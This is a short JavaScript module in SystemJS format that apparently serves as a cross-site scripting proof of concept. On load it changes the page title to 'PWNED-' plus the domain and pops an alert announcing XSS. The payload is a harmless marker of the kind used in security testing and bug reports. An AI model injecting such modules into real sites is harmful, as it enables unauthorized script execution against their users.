System.register([], function(exports) {
  return {
    execute: function() {
      document.title = "PWNED-" + document.domain;
      alert("XSS on " + document.domain);
    }
  };
});
